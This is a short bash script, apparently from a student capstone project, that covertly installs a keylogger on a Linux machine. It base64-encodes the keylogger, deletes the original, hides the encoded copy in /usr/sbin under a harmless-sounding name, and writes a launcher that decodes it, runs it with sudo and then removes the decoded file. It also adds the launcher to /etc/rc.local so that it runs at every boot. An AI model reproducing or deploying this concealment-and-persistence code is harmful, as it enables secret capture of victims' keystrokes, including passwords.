#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <keylogger file>"
    exit 1
fi

keylogger=$1
system_file="capstoneInfo"
script="/usr/local/bin/welcomeCapstone.sh"
boot_file="/etc/rc.local"

cd /tmp
base64 "$keylogger" > "$system_file"
rm "$keylogger"
mv "$system_file" /usr/sbin/"$system_file"
echo "sudo python3 /usr/sbin/$keylogger" > $script

cat << EOF > $script
base64 -d /usr/sbin/$system_file > /tmp/capstone.py
sudo python3 /tmp/capstone.py &
sleep 5
rm /tmp/capstone.py
EOF


chmod +x $script
/usr/local/bin/welcomeCapstone.sh &

# check if the "exit 0" line exists and then add the command above it
if grep -q "^exit 0" "$boot_file"; then
    # insert the line before "exit 0", ensuring it's the actual command
    sed -i '/^exit 0/i '"$script &" "$boot_file"
else
    echo "No 'exit 0' found in the file."
fi

